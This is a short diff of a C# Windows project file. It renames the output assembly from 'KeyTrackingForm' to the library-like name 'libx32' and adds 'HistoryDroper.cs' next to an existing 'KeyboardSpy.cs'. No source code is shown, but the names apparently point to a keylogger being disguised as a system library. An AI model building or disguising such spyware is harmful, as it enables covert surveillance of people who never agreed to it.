@@ -8,7 +8,7 @@
     <OutputType>WinExe</OutputType>
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>KeyTrackingForm</RootNamespace>
-    <AssemblyName>KeyTrackingForm</AssemblyName>
+    <AssemblyName>libx32</AssemblyName>
     <TargetFrameworkVersion>v4.5.2</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
@@ -50,6 +50,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="HistoryDroper.cs" />
     <Compile Include="KeyboardSpy.cs" />
     <Compile Include="Program.cs" />
   </ItemGroup>
